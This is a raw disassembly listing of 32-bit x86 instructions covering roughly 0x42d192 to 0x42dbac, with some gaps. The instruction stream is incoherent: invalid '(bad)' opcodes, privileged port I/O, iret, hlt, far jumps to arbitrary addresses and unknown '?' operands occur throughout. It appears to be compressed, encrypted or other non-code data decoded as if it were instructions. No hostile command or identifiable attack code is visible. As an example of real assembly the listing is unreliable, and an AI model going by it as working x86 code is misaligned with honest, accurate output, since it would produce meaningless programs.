  42d192:	jl     0x42d12f
  42d194:	pop    es
  42d195:	mov    al,bl
  42d197:	or     eax,DWORD PTR [edi+0x29]
  42d19a:	and    eax,0xbb706292
  42d19f:	mov    esi,0xf34cb0b9
  42d1a4:	iret   
  42d1a5:	xor    bl,BYTE PTR [ecx+0x74]
  42d1a8:	inc    BYTE PTR [ebx]
  42d1aa:	int3   
  42d1ab:	lahf   
  42d1ac:	loopne 0x42d1ed
  42d1ae:	inc    ecx
  42d1af:	sub    al,0xb0
  42d1b1:	adc    al,0xe2
  42d1b3:	xchg   ecx,eax
  42d1b4:	inc    BYTE PTR [edi]
  42d1b6:	jnp    0x42d15b
  42d1b8:	fnstsw WORD PTR [ebx+0x54]
  42d1bb:	cmc    
  42d1bc:	xor    bh,dl
  42d1be:	dec    ebp
  42d1bf:	cmp    al,0xb2
  42d1c1:	in     eax,dx
  42d1c2:	push   edi
  42d1c3:	or     dh,BYTE PTR [eax+0x72]
  42d1c6:	fsub   QWORD PTR [edi-0x40]
  42d1c9:	or     edx,DWORD PTR [edi+0x1c]
  42d1cc:	test   al,0x4b
  42d1ce:	in     eax,0x50
  42d1d0:	xchg   esi,eax
  42d1d1:	adc    ebp,DWORD PTR [edi+0x367ca436]
  42d1d7:	push   edi
  42d1d8:	out    dx,eax
  42d1d9:	cwd    
  42d1db:	push   esi
  42d1dc:	das    
  42d1dd:	sub    al,0x99
  42d1df:	inc    ebp
  42d1e0:	mov    bh,0xd2
  42d1e2:	les    esi,FWORD PTR [edi-0x4b2ed4a0]
  42d1e8:	add    esi,0x6a75fa1c
  42d1ee:	cs scas al,BYTE PTR es:[edi]
  42d1f0:	pushf  
  42d1f1:	repnz test DWORD PTR [eax],ebp
  42d1f4:	icebp  
  42d1f5:	leave  
  42d1f6:	test   BYTE PTR [ebp-0x3b],ch
  42d1f9:	or     dl,BYTE PTR [edx]
  42d1fb:	adc    BYTE PTR [ebx],ch
  42d1fd:	hlt    
  42d1fe:	add    DWORD PTR [edx],ecx
  42d200:	push   esi
  42d201:	shr    DWORD PTR [esi+edx*4],0x3f
  42d205:	mov    al,ds:0x7dacd813
  42d20a:	xchg   DWORD PTR [edi+eax*8],ebx
  42d20d:	retf   
  42d20e:	fadd   DWORD PTR [ecx]
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d276
  42d281:	fisttp DWORD PTR [ecx]
  42d283:	daa    
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	imul   esi,DWORD PTR [esi+0x684ceddf],0xffffffb5
  42d293:	mov    BYTE PTR [ebp+0x43],ch
  42d296:	jmp    0x11e273da
  42d29b:	imul   ecx,edi,0xffffff9b
  42d29e:	aas    
  42d29f:	and    ch,bh
  42d2a1:	enter  0x1fce,0x76
  42d2a5:	aad    0xe9
  42d2a7:	out    0x89,eax
  42d2a9:	or     eax,0x3080865f
  42d2ae:	cli    
  42d2af:	jge    0x42d323
  42d2b1:	retf   
  42d2b2:	mov    ds:0xba8e7232,eax
  42d2b7:	dec    dl
  42d2b9:	dec    ecx
  42d2ba:	(bad)  
  42d2bb:	nop
  42d2bc:	push   edi
  42d2bd:	mov    ecx,0x3f828945
  42d2c2:	inc    ebx
  42d2c3:	ins    DWORD PTR es:[edi],dx
  42d2c4:	jl     0x42d342
  42d2c6:	cmp    esi,esp
  42d2c8:	pushf  
  42d2c9:	xor    bl,BYTE PTR [ecx-0x3]
  42d2cc:	sbb    DWORD PTR [eax+0x54d76eda],esp
  42d2d2:	(bad)  
  42d2d4:	pop    es
  42d2d5:	pop    eax
  42d2d6:	fyl2xp1 
  42d2d8:	nop
  42d2d9:	mov    edi,DWORD PTR [eax+0x67acc5fc]
  42d2df:	or     al,0xdb
  42d2e1:	(bad)  [edx+0x63fee319]
  42d2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2e8:	cmp    DWORD PTR ds:0xb1ca,ebx
  42d2ed:	cmp    al,0x1f
  42d2ef:	retf   0x7c9b
  42d2f2:	inc    ebx
  42d2f3:	sub    DWORD PTR [eax-0x74739269],0x61
  42d2fa:	inc    ebp
  42d2fb:	or     BYTE PTR [eax-0x3b009b99],dh
  42d301:	xchg   esp,eax
  42d302:	pop    ss
  42d303:	xor    al,0x45
  42d305:	xchg   ecx,eax
  42d306:	sub    dh,al
  42d308:	push   es
  42d309:	sbb    bh,BYTE PTR [edx-0x75c4f328]
  42d30f:	bound  eax,QWORD PTR [bp-0x3d]
  42d313:	or     al,0x28
  42d315:	sti    
  42d316:	xchg   esi,eax
  42d317:	push   edi
  42d318:	ins    BYTE PTR es:[edi],dx
  42d319:	xlat   BYTE PTR ds:[ebx]
  42d31a:	push   ecx
  42d31b:	mov    edi,0xf6fc9c88
  42d320:	fwait
  42d321:	add    al,0xb9
  42d323:	pop    edx
  42d324:	and    al,0x4
  42d326:	rcr    ebx,0x39
  42d329:	sub    DWORD PTR [ecx+0x67],ebx
  42d32c:	xchg   DWORD PTR [edx+0x3d],ecx
  42d32f:	or     DWORD PTR [ecx],ecx
  42d331:	push   cs
  42d332:	push   eax
  42d333:	xlat   BYTE PTR ds:[ebx]
  42d334:	jle    0x42d2fd
  42d336:	cli    
  42d337:	mov    eax,0x8ba29795
  42d33c:	jge    0x42d322
  42d33e:	leave  
  42d33f:	push   eax
  42d340:	mov    ds:0x84bfcbb1,eax
  42d345:	out    0xac,eax
  42d347:	dec    ecx
  42d348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d349:	jne    0x42d333
  42d34b:	sub    al,0xe4
  42d34d:	cmp    al,0x61
  42d34f:	ins    BYTE PTR es:[edi],dx
  42d350:	fsubr  DWORD PTR [edx+0x21]
  42d353:	daa    
  42d354:	loop   0x42d370
  42d356:	jno    0x42d3b7
  42d358:	pop    es
  42d359:	cdq    
  42d35a:	sub    DWORD PTR [eax],ebx
  42d35c:	adc    eax,0x88a1328
  42d361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d362:	retf   
  42d363:	add    BYTE PTR [esp+ebp*4-0x360bb1dc],bh
  42d36a:	or     ah,BYTE PTR [eax+0x73]
  42d36d:	mov    eax,0x40b525aa
  42d372:	push   0x6f
  42d374:	mov    ebp,0xebb4cc1d
  42d379:	jmp    0xb1a5:0xcba2b7ef
  42d380:	mul    BYTE PTR [ecx+0x1f799869]
  42d386:	mov    esi,DWORD PTR [eax+0x38]
  42d389:	out    dx,eax
  42d38a:	sub    al,0x6
  42d38c:	push   edx
  42d38d:	fisttp WORD PTR [ebx+0xf7]
	...
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	enter  0x2662,0xc
  42d404:	adc    al,0xe4
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	sbb    al,0x96
  42d40e:	fisttp WORD PTR [esi-0x7a]
  42d411:	stos   BYTE PTR es:[edi],al
  42d412:	add    DWORD PTR ds:0x53f1725a,0x326c7d15
  42d41c:	das    
  42d41d:	mov    eax,DWORD PTR [ecx+0x24]
  42d420:	popf   
  42d421:	and    DWORD PTR [ecx-0x6c2a0b7d],esi
  42d427:	cmp    al,BYTE PTR [esi+0x17]
  42d42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d42b:	xchg   ebx,eax
  42d42c:	out    0x41,eax
  42d42e:	jb     0x42d426
  42d430:	fcomp  st(0)
  42d432:	shr    DWORD PTR [edx+0x56],0xd3
  42d436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d437:	cdq    
  42d438:	sub    BYTE PTR [ecx],al
  42d43a:	jecxz  0x42d3d7
  42d43c:	mov    ah,bl
  42d43e:	push   cs
  42d43f:	xchg   DWORD PTR [eax+edx*4],ebx
  42d442:	sub    DWORD PTR [ebp+0x6f],0xffffffc2
  42d446:	sub    DWORD PTR [esi],0x5a16de69
  42d44c:	add    BYTE PTR [ecx-0x4d],dh
  42d44f:	or     eax,0x275925c3
  42d454:	fild   WORD PTR ds:[eax]
  42d457:	add    DWORD PTR [esi+0x6000c610],edi
  42d45d:	jecxz  0x42d448
  42d45f:	add    ch,BYTE PTR [ebx-0x5cd3ccf8]
  42d465:	ins    DWORD PTR es:[edi],dx
  42d466:	loop   0x42d4d2
  42d468:	dec    edi
  42d469:	xor    BYTE PTR [esi+eiz*1-0x2c],dh
  42d46d:	mov    eax,ds:0x56565504
  42d472:	outs   dx,DWORD PTR ds:[esi]
  42d473:	enter  0x3186,0x7a
  42d477:	lods   al,BYTE PTR ds:[esi]
  42d478:	mov    eax,0x603b7391
  42d47d:	clc    
  42d47e:	fst    QWORD PTR [edi+edx*2]
  42d481:	retf   
  42d482:	enter  0x409e,0x1d
  42d486:	lds    edx,FWORD PTR [edi-0x5fda6a96]
  42d48c:	or     eax,esi
  42d48e:	repz sti 
  42d490:	dec    ecx
  42d491:	and    eax,0x7dcca218
  42d496:	or     DWORD PTR [ebx+0x2e],ecx
  42d499:	fdivr  QWORD PTR [ebp+ecx*4-0xcb47dbf]
  42d4a0:	add    al,0x28
  42d4a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4a3:	js     0x42d469
  42d4a5:	stos   DWORD PTR es:[edi],eax
  42d4a6:	pop    edi
  42d4a7:	sbb    eax,0xc8964805
  42d4ac:	fimul  WORD PTR [ebx-0x10710301]
  42d4b2:	sahf   
  42d4b3:	cmp    ah,dl
  42d4b5:	in     eax,0x3d
  42d4b7:	pop    es
  42d4b8:	push   cs
  42d4b9:	and    BYTE PTR [ebx-0x68d5e9f4],dh
  42d4bf:	dec    ecx
  42d4c0:	into   
  42d4c1:	or     DWORD PTR [esp+ecx*4],esi
  42d4c4:	repnz cmp DWORD PTR [esi],eax
  42d4c7:	jns    0x42d504
  42d4c9:	ret    0xba98
  42d4cc:	int3   
  42d4cd:	push   ecx
  42d4ce:	lock sbb ecx,ebp
  42d4d1:	sahf   
  42d4d2:	ds out 0x5,eax
  42d4d5:	aaa    
  42d4d6:	dec    edx
  42d4d7:	imul   ebp,DWORD PTR [ebx-0x2fc1a18b],0x34
  42d4de:	ins    BYTE PTR es:[edi],dx
  42d4df:	mov    cl,0xc4
  42d4e1:	xchg   edx,eax
  42d4e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4e3:	fsub   QWORD PTR ds:[edx-0x42522592]
  42d4ea:	pop    edx
  42d4eb:	and    DWORD PTR [ebp+0x741f755c],0xffffff89
  42d4f2:	and    BYTE PTR [eax-0x28c85b67],0xac
  42d4f9:	cmp    eax,0x54f7d996
  42d4fe:	fcomp  DWORD PTR [ebx+0x4f]
  42d501:	xchg   ebx,eax
  42d502:	das    
  42d503:	stc    
  42d504:	push   ebp
  42d505:	pop    eax
  42d506:	ds adc edx,edi
  42d509:	(bad)  
  42d50a:	xor    eax,0x62beaed3
  42d50f:	sldt   WORD PTR [eax]
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x45403bd5,eax
  42d583:	sub    al,0x18
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	test   DWORD PTR [esi+0x7c14587],eax
  42d592:	idiv   DWORD PTR [ecx+0x46457cb0]
  42d598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d599:	sub    al,0xab
  42d59b:	xchg   esi,eax
  42d59c:	loopne 0x42d60f
  42d59e:	out    dx,al
  42d59f:	cmp    al,0x4b
  42d5a2:	cmp    dl,BYTE PTR ds:0x8c89f3df
  42d5a8:	jle    0x42d548
  42d5aa:	inc    esp
  42d5ab:	pop    ecx
  42d5ac:	sar    BYTE PTR [ebp-0x6645c8fb],cl
  42d5b2:	daa    
  42d5b3:	pop    ebp
  42d5b4:	(bad)  
  42d5b5:	add    DWORD PTR [eax*2-0x2c686c2c],ecx
  42d5bc:	out    dx,eax
  42d5bd:	jbe    0x42d619
  42d5bf:	repnz and eax,0x5cdec207
  42d5c5:	cmc    
  42d5c6:	adc    ch,BYTE PTR [ecx+0x66]
  42d5c9:	ja     0x42d5a9
  42d5cb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5cd:	mov    DWORD PTR [esi+0x4f24a75d],esp
  42d5d3:	jmp    0x553e5c20
  42d5d8:	xchg   esp,eax
  42d5d9:	sahf   
  42d5da:	push   es
  42d5db:	ret    0xba8
  42d5de:	out    dx,al
  42d5df:	imul   edx,DWORD PTR fs:[eax],0xda1eb856
  42d5e6:	inc    ebp
  42d5e7:	mov    edi,0x70b949f1
  42d5ec:	imul   edi,DWORD PTR [ecx+0x1b],0x42f626a1
  42d5f3:	cmp    BYTE PTR [esi+0x3e],0x3
  42d5f7:	aas    
  42d5f8:	sbb    DWORD PTR [ecx+0x4fb3c325],edi
  42d5fe:	test   eax,0x3752f773
  42d603:	xor    edi,DWORD PTR [edx-0x1bebcc14]
  42d609:	fld    TBYTE PTR [ecx-0x592beeb3]
  42d60f:	add    eax,0x43c99b5d
  42d614:	sti    
  42d615:	jns    0x42d5fb
  42d617:	addr16 jle 0x42d67b
  42d61a:	and    ah,BYTE PTR [ebx+0x491b6e68]
  42d620:	cdq    
  42d621:	int3   
  42d622:	iret   
  42d623:	dec    esi
  42d624:	mov    BYTE PTR [edi],ah
  42d626:	dec    DWORD PTR [eax]
  42d628:	fcomp  st(5)
  42d62a:	sub    DWORD PTR [edx],edi
  42d62c:	nop
  42d62d:	push   esp
  42d62e:	in     al,0x16
  42d630:	sub    al,0x1f
  42d632:	stc    
  42d633:	cmp    ah,bh
  42d635:	(bad)  
  42d636:	push   ss
  42d637:	scas   al,BYTE PTR es:[edi]
  42d638:	mov    al,ds:0x968de83
  42d63d:	dec    ecx
  42d63e:	cmp    al,0xed
  42d640:	adc    BYTE PTR [ecx-0x64],cl
  42d643:	mov    ds:0x683e54e9,al
  42d648:	aaa    
  42d649:	xchg   ecx,eax
  42d64a:	mov    cl,0x8
  42d64c:	ret    
  42d64d:	stos   BYTE PTR es:[edi],al
  42d64e:	jo     0x42d669
  42d650:	inc    ebp
  42d651:	es in  al,dx
  42d653:	loop   0x42d654
  42d655:	hlt    
  42d656:	push   ecx
  42d657:	cmp    eax,0xaef12e2e
  42d65c:	ficom  DWORD PTR [ebx-0x9]
  42d65f:	or     BYTE PTR [eax+0x56083612],bl
  42d665:	jle    0x42d67d
  42d667:	arpl   WORD PTR ds:0x75d70b06,sp
  42d66d:	es popf 
  42d66f:	push   ebx
  42d670:	hlt    
  42d671:	out    0x3,eax
  42d673:	nop
  42d674:	ins    BYTE PTR es:[edi],dx
  42d675:	ja     0x42d66c
  42d677:	frstor [edi+0x1a2140cc]
  42d67d:	cmc    
  42d67e:	xchg   BYTE PTR [ebx+0x18b959e1],cl
  42d684:	jg     0x42d6b9
  42d686:	ret    
  42d687:	(bad)  
  42d688:	mov    esi,0xea3d593a
  42d68d:	out    dx,eax
  42d68e:	cwde   
  42d68f:	ins    DWORD PTR es:[edi],dx
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x91
  42d701:	sub    eax,DWORD PTR [ecx+0x14]
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	aas    
  42d70d:	inc    BYTE PTR [ebx-0x31]
  42d710:	int    0xa9
  42d712:	push   0x4c
  42d714:	mov    ds:0x7f61e0a1,eax
  42d719:	add    eax,0xcf8e6cf9
  42d71e:	mov    ds:0x23b43453,al
  42d723:	or     al,0xd0
  42d725:	std    
  42d726:	jno    0x42d6a9
  42d728:	add    BYTE PTR cs:[edx-0x18],0x16
  42d72d:	pop    ebx
  42d72e:	icebp  
  42d72f:	cmp    ecx,DWORD PTR [ecx+0x71527144]
  42d735:	adc    BYTE PTR [edi-0x2b4253f9],dl
  42d73b:	jge    0x42d798
  42d73d:	lds    ebx,FWORD PTR [ebp-0x63]
  42d740:	pop    esi
  42d741:	fsub   DWORD PTR [esi+0x47]
  42d744:	test   al,0x33
  42d746:	cmp    bl,BYTE PTR [esi-0x4e]
  42d749:	push   0xffffff80
  42d74b:	test   al,0xe9
  42d74d:	test   eax,0xec681bb9
  42d752:	sahf   
  42d753:	inc    eax
  42d754:	aas    
  42d755:	shl    BYTE PTR fs:[esi+eiz*1+0xb95dce],0x11
  42d75e:	jl     0x42d746
  42d760:	inc    eax
  42d761:	lods   al,BYTE PTR ds:[esi]
  42d762:	test   BYTE PTR [esi+0x3a89677a],bh
  42d768:	je     0x42d7e3
  42d76a:	dec    esp
  42d76b:	cmp    BYTE PTR [ebx+edi*2+0x11a37dba],dh
  42d772:	mov    al,ds:0x38cc11b5
  42d777:	xchg   ebx,eax
  42d778:	pop    eax
  42d779:	outs   dx,BYTE PTR ds:[esi]
  42d77a:	mov    DWORD PTR [edi+0x54aa24ab],esp
  42d780:	mov    edx,0xdf5e2dfd
  42d785:	sub    eax,0xc5ca6238
  42d78a:	repnz and ebp,DWORD PTR [esi+eiz*4]
  42d78e:	enter  0x2f29,0x81
  42d792:	iret   
  42d793:	aam    0xcd
  42d795:	inc    esp
  42d796:	cmp    DWORD PTR [eax],esp
  42d798:	adc    edx,esi
  42d79a:	int3   
  42d79b:	cmp    eax,0xc64a298b
  42d7a0:	clc    
  42d7a1:	mov    dl,0xa4
  42d7a3:	(bad)  [edi+0x65]
  42d7a6:	fild   QWORD PTR [ecx+ebp*2]
  42d7a9:	addr16 ret 
  42d7ab:	push   0x30
  42d7ad:	fisubr WORD PTR [ebx]
  42d7af:	add    eax,0xbeb7d43f
  42d7b4:	mov    ds:0xfc2bf2d9,eax
  42d7b9:	pop    esi
  42d7ba:	push   ss
  42d7bb:	jbe    0x42d7f9
  42d7bd:	sub    eax,0xed9f529a
  42d7c2:	ror    DWORD PTR [edx+0x36],1
  42d7c5:	adc    eax,0x95b534b9
  42d7ca:	xor    eax,0x89c57493
  42d7cf:	dec    esi
  42d7d0:	and    bl,BYTE PTR [ebx-0x3b]
  42d7d3:	fcmovnb st,st(5)
  42d7d5:	push   ebp
  42d7d6:	jo     0x42d786
  42d7d8:	cwde   
  42d7d9:	mov    WORD PTR [ebx],gs
  42d7db:	mov    esp,0x25db30f0
  42d7e0:	mov    esi,0xe2faa67
  42d7e5:	mov    al,0xa0
  42d7e7:	dec    ebx
  42d7e8:	or     DWORD PTR [ecx],ecx
  42d7ea:	adc    al,0xdd
  42d7ec:	into   
  42d7ed:	and    esi,0x91f17006
  42d7f3:	cmc    
  42d7f4:	fldcw  WORD PTR [ecx-0x14]
  42d7f7:	add    bl,BYTE PTR [ebp+0x3a6cf832]
  42d7fd:	rcr    BYTE PTR [ebx-0x36],0xf
  42d801:	pop    es
  42d802:	stos   BYTE PTR es:[edi],al
  42d803:	cmp    BYTE PTR [edx+0x2d],bl
  42d806:	cmp    DWORD PTR [ecx+0x22d431f8],0xc8990415
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x17c6961a
  42d881:	and    al,0xe2
  42d883:	cld    
  42d884:	and    bh,ah
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	mov    al,0x1b
  42d88e:	push   eax
  42d88f:	dec    esi
  42d890:	pop    eax
  42d891:	push   ss
  42d892:	add    BYTE PTR [edi+0x7d],cl
  42d895:	sti    
  42d896:	pop    edx
  42d897:	mov    cl,0x2a
  42d899:	and    BYTE PTR [ecx],dl
  42d89b:	ja     0x42d8b8
  42d89d:	(bad)  
  42d89e:	push   ss
  42d89f:	enter  0xc24e,0x54
  42d8a3:	aad    0x17
  42d8a5:	mov    eax,0x8dd9d0c0
  42d8aa:	in     eax,0xe0
  42d8ac:	sbb    ch,ah
  42d8ae:	push   edi
  42d8af:	cmp    BYTE PTR [ecx+ecx*2-0x1a099c5a],ch
  42d8b6:	sbb    DWORD PTR [edx-0x4e],0xe
  42d8ba:	loop   0x42d92e
  42d8bc:	inc    ebp
  42d8bd:	jo     0x42d8d3
  42d8bf:	pop    esp
  42d8c0:	mov    esi,0x88b27419
  42d8c5:	cmp    DWORD PTR [esi+0x474d604b],edi
  42d8cb:	dec    ebp
  42d8cc:	adc    eax,0x93c3c153
  42d8d1:	xor    DWORD PTR [esi+0x57],ecx
  42d8d4:	or     DWORD PTR [ebx],esi
  42d8d6:	adc    DWORD PTR [ebx-0x42213acf],ebp
  42d8dc:	cli    
  42d8dd:	xor    dh,BYTE PTR [esi]
  42d8df:	loope  0x42d8eb
  42d8e1:	pop    ecx
  42d8e2:	or     bl,ch
  42d8e4:	enter  0xad9e,0x22
  42d8e8:	repnz mov al,0xf0
  42d8eb:	mov    ecx,0x204f9c84
  42d8f0:	mov    ch,0x9d
  42d8f2:	stos   DWORD PTR es:[edi],eax
  42d8f3:	repnz push cs
  42d8f5:	mov    DWORD PTR [edi],ebx
  42d8f7:	aaa    
  42d8f8:	bound  esp,QWORD PTR [edx-0x32e2a95e]
  42d8fe:	ins    DWORD PTR es:[edi],dx
  42d8ff:	shl    ebp,0x33
  42d902:	sbb    eax,0x12e1fab0
  42d907:	jle    0x42d908
  42d909:	mov    ?,WORD PTR [esi]
  42d90b:	sbb    ecx,DWORD PTR [ecx-0x64]
  42d90e:	sub    DWORD PTR [eax],edi
  42d910:	cmp    eax,0x2fdd44f6
  42d915:	jbe    0x42d913
  42d917:	fwait
  42d918:	inc    ebx
  42d919:	xchg   esi,eax
  42d91a:	xchg   esp,eax
  42d91b:	xchg   edi,eax
  42d91c:	mov    esi,0x5a09153
  42d921:	pop    esp
  42d922:	mov    dl,0x30
  42d924:	test   eax,edi
  42d926:	ret    0x7ec3
  42d929:	rcl    DWORD PTR [ebx-0x65a65431],1
  42d92f:	fiadd  DWORD PTR [eax]
  42d931:	push   0x53
  42d933:	(bad)  
  42d934:	xchg   edi,eax
  42d935:	sub    al,0x10
  42d937:	dec    esi
  42d938:	ins    BYTE PTR es:[edi],dx
  42d939:	test   ebp,0xc7b817fd
  42d93f:	imul   ecx,DWORD PTR [edx-0x1aedd870],0x4a
  42d946:	xchg   ebp,eax
  42d947:	dec    ebp
  42d948:	popw   fs
  42d94b:	mov    ds:0x74cfc8b,eax
  42d950:	xchg   ecx,eax
  42d951:	out    dx,eax
  42d952:	(bad)  [ebp-0x4d8da696]
  42d958:	lock lea esp,[esi-0x641bfe95]
  42d95f:	sbb    BYTE PTR [edx],dh
  42d961:	cli    
  42d962:	sub    al,BYTE PTR ds:0xc894f966
  42d968:	ror    ah,1
  42d96a:	push   edi
  42d96b:	cmp    BYTE PTR [ecx],bl
  42d96d:	pop    es
  42d96e:	jle    0x42d990
  42d970:	mov    BYTE PTR [ebx-0x3b30e8fe],bl
  42d976:	fs lahf 
  42d978:	enter  0x360,0x8b
  42d97c:	sbb    edi,edi
  42d97e:	(bad)  
  42d97f:	iret   
  42d980:	pop    ss
  42d981:	scas   al,BYTE PTR es:[edi]
  42d982:	adc    al,0xf0
  42d984:	sub    bl,bh
  42d986:	pop    esp
  42d987:	jle    0x42d925
  42d989:	(bad)  
  42d98a:	jno    0x42da09
  42d98c:	pop    esi
  42d98d:	das    
  42d98e:	xchg   ebx,eax
  42d98f:	test   DWORD PTR [eax],0x0
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	mov    DWORD PTR [esi-0x76],esp
  42da03:	mov    ds:0x1e824,al
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	xor    ah,ch
  42da0e:	inc    ebp
  42da0f:	push   edx
  42da10:	dec    ebx
  42da11:	jmp    DWORD PTR [esi-0x371a3884]
  42da17:	das    
  42da18:	adc    cl,bl
  42da1a:	push   0xffffffcf
  42da1c:	icebp  
  42da1d:	pop    edx
  42da1e:	inc    esp
  42da1f:	outs   dx,BYTE PTR ds:[esi]
  42da20:	xchg   edi,eax
  42da21:	mov    BYTE PTR [eax-0x8c1cfd2],bl
  42da27:	and    eax,0x70
  42da2a:	jb     0x42d9c4
  42da2c:	or     BYTE PTR [esi+edi*8-0x66],dl
  42da30:	or     al,0x2c
  42da32:	dec    edx
  42da33:	push   0x16
  42da35:	ja     0x42da65
  42da37:	dec    esi
  42da38:	mov    ebp,ds
  42da3a:	push   ebp
  42da3b:	jne    0x42d9cc
  42da3d:	ins    BYTE PTR es:[edi],dx
  42da3e:	push   eax
  42da3f:	out    0x4f,al
  42da41:	adc    al,0x2a
  42da43:	cmc    
  42da44:	jge    0x42daaf
  42da46:	stos   DWORD PTR es:[edi],eax
  42da47:	mov    bh,bh
  42da49:	push   ecx
  42da4a:	inc    ecx
  42da4b:	out    dx,al
  42da4c:	daa    
  42da4d:	xchg   ebx,eax
  42da4e:	dec    eax
  42da4f:	and    DWORD PTR [edx+0x15f8ec9c],0x23
  42da56:	mov    ecx,0x3dc0aec8
  42da5b:	push   ebp
  42da5c:	sbb    bl,ch
  42da5e:	mov    al,ds:0xe05b4cd7
  42da63:	pop    esi
  42da64:	mov    ecx,0xdec0de6
  42da69:	push   ebp
  42da6a:	outs   dx,BYTE PTR ds:[esi]
  42da6b:	clc    
  42da6c:	ja     0x42dad6
  42da6e:	cli    
  42da6f:	jmp    0x3b29:0x75165d4d
  42da76:	mov    eax,0xd219a5b6
  42da7b:	cmp    al,0xfa
  42da7d:	popf   
  42da7e:	sub    ch,BYTE PTR [esi-0xe]
  42da81:	int    0x8b
  42da83:	mov    ?,esi
  42da85:	adc    DWORD PTR [ebp-0x9ce84e6],0x8925bb67
  42da8f:	fistp  QWORD PTR [edx-0x5a4dbc19]
  42da95:	jmp    0x42daac
  42da97:	mov    ecx,0x60c2c938
  42da9c:	fadd   QWORD PTR [ebp-0xf]
  42da9f:	arpl   WORD PTR [ebx+0x4f380dd9],bx
  42daa5:	jb     0x42dad2
  42daa7:	cmp    al,0xe5
  42daa9:	lds    eax,FWORD PTR ds:0x1bc78183
  42daaf:	add    al,0x3b
  42dab1:	xlat   BYTE PTR ds:[ebx]
  42dab2:	sub    eax,0x55dd7157
  42dab7:	add    esi,edx
  42dab9:	data16 into 
  42dabb:	shr    DWORD PTR [edx+0x43],1
  42dabe:	(bad)  
  42dabf:	into   
  42dac0:	pop    edi
  42dac1:	sbb    eax,0xbd98aac8
  42dac6:	inc    DWORD PTR [eax*1+0xb18006f]
  42dacd:	aas    
  42dace:	mov    DWORD PTR [esi-0x3e],esp
  42dad1:	(bad)  
  42dad2:	out    dx,al
  42dad3:	outs   dx,BYTE PTR ds:[esi]
  42dad4:	enter  0x1eae,0xbc
  42dad8:	test   al,0xb9
  42dada:	out    dx,eax
  42dadb:	jecxz  0x42dae1
  42dadd:	mov    al,BYTE PTR [edx+0x30d95ede]
  42dae3:	rol    BYTE PTR [edi+0x497604d8],0x34
  42daea:	sub    ebp,edx
  42daec:	ja     0x42da8b
  42daee:	inc    eax
  42daef:	mov    ds:0x60922951,eax
  42daf4:	pop    esi
  42daf5:	std    
  42daf6:	jb     0x42da94
  42daf8:	add    BYTE PTR [edi+0x71a7bf92],ch
  42dafe:	ins    BYTE PTR es:[edi],dx
  42daff:	shl    DWORD PTR [edx-0x78dbf6e9],cl
  42db05:	loopne 0x42db18
  42db07:	jge    0x42daff
  42db09:	and    al,0xa0
  42db0b:	pop    esp
  42db0c:	pop    ss
  42db0d:	xchg   edi,eax
  42db0e:	or     BYTE PTR [eax+eax*1+0x0],al
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db4c
  42db81:	sub    al,0x6f
  42db83:	je     0x42dbad
  42db85:	jmp    0x146db8b
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	jnp    0x42dbeb
  42db8e:	out    dx,al
  42db8f:	xchg   ecx,eax
  42db90:	xor    eax,0xde0cc362
  42db95:	or     esp,ebp
  42db97:	test   dl,cl
  42db99:	jmp    0x45d3:0x573e75af
  42dba0:	xchg   ebx,eax
  42dba1:	xchg   edi,eax
  42dba2:	loopne 0x42db80
  42dba4:	inc    edi
  42dba5:	iret   
  42dba6:	cld    
  42dba7:	dec    esp
  42dba8:	das    
  42dba9:	pop    ds
  42dbaa:	dec    ecx
  42dbab:	dec    ebp
  42dbac:	mov    BYTE PTR [edi-0x7fef6d0e],cl
